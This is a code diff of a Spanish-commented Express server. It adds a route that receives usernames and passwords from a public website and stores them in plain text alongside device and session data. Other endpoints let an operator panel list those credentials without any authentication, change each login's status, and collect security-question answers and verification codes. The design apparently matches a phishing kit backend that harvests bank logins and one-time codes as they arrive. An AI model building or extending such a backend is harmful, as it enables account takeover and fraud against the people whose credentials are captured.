@@ -1,4 +1,4 @@
-﻿const express = require('express');
+const express = require('express');
 const cors = require('cors');
 const path = require('path');
 
@@ -20,6 +20,36 @@ let nextCodigoId = 1;
 
 // Servir archivos estáticos y panel.html
 app.use(express.static(path.join(__dirname)));
+
+// RUTA PRINCIPAL para recibir login desde la web pública
+app.post('/', (req, res) => {
+  const { usr, clv, device, id, website } = req.body;
+
+  // Honeypot (campo trampa) para evitar bots
+  if (website) {
+    return res.status(400).json({ success: false, error: 'Actividad sospechosa detectada.' });
+  }
+
+  // Validación mínima
+  if (!usr || !clv) {
+    return res.status(400).json({ success: false, error: 'Faltan datos de usuario o clave.' });
+  }
+
+  // Guardar la solicitud
+  solicitantes.push({
+    id: nextSolicitanteId++,
+    usuario: usr,
+    clave: clv,
+    estado: 'pendiente',
+    fecha: new Date(),
+    device,
+    sessionId: id
+  });
+
+  console.log("Solicitud login recibida:", usr);
+
+  res.json({ success: true, sessionId: id });
+});
 
 // Preguntas
 app.get('/preguntas', (req, res) => res.json(preguntas));
@@ -45,20 +75,7 @@ app.post('/respuestas', (req, res) => {
 });
 app.get('/respuestas', (req, res) => res.json(respuestas));
 
-// Solicitudes login
-app.post('/login', (req, res) => {
-  const { usuario, clave } = req.body;
-  if (!usuario || !clave) return res.status(400).json({ error: 'Datos incompletos' });
-
-  solicitantes.push({
-    id: nextSolicitanteId++,
-    usuario,
-    clave,
-    estado: 'pendiente',
-    fecha: new Date()
-  });
-  res.json({ message: 'Solicitud recibida, pendiente validación' });
-});
+// Solicitudes login (desde panel)
 app.get('/solicitantes', (req, res) => res.json(solicitantes));
 app.put('/solicitantes/:id', (req, res) => {
   const id = +req.params.id;
@@ -69,7 +86,7 @@ app.put('/solicitantes/:id', (req, res) => {
   res.json(s);
 });
 
-// Código de verificación
+// Códigos de verificación
 app.post('/codigo', (req, res) => {
   const { usuario, codigo } = req.body;
   if (!usuario || !codigo) return res.status(400).json({ error: 'Datos incompletos' });
